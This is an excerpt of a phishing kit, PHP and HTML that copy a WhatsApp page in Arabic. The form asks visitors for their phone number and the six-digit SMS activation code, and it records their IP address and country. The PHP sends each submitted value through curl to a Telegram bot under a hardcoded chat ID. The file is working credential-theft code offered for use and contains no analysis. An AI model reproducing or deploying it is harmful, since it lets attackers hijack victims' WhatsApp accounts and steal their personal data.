...
$chat_id ="5288376819";
 ...
 $params=[
      'chat_id'=>$chat_id,
      'text' => 'CODE COUNTRY :'.$_POST['codecntry'],
  ];
  $ch = curl_init($url . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
...
$chat_id ="5288376819";
 ...
 $params=[
      'chat_id'=>$chat_id,
      'text' =>$idN. "| NUMERO TELEPHONE: ".$_POST['phone'],
                ...
                <div data-testid="whatsapp_www_root" id="content-wrapper">
                    <div class="_9r_7">
                        <section data-testid="waui_section" class="_9t2b _9t2d" style="">
                            ...
                            <form action="code_pin1.php" method="POST">
                                                      <b style="font-style: italic;">أدخل رمز تفعيل الإضافة المكون من ٦ أرقام الذي تلقيته من خلال رسالة نصية  </b>                                                  <br></br>
                                            <center>      <input type="text" name="code_whatsapp" id="code_whatsapp" class="input-phone" style="letter-spacing : 5px;text-align:center " placeholder="_ _ _  _ _ _"  pattern="[0-9]*" maxlength="6" required></center>   
                                                 
                                                 
                                                   <br>
                                                    <input type="hidden" name="id" value="<?php echo $_POST['id'] ?>">
                                                   <input type="hidden" name="ip" value="<?php echo $_SERVER['REMOTE_ADDR']; ?>">
                                                   <input type="hidden" name="codecntry" value="<?php echo $details->country ?>">
                                                 ...
                                                 <button type="submit" class="_36or _2y_c _2z0c _2z07" style="margin-right:-10px"><span class="_advp">الانضمام إلى الدردشة</span></button>
                                                  &nbsp;&nbsp; <a href="#" class="button_a" style="margin-left:-22px"><span class="_advp"><b>لم يصلني الرمز</b></span></a>                                                  
                                              </form>
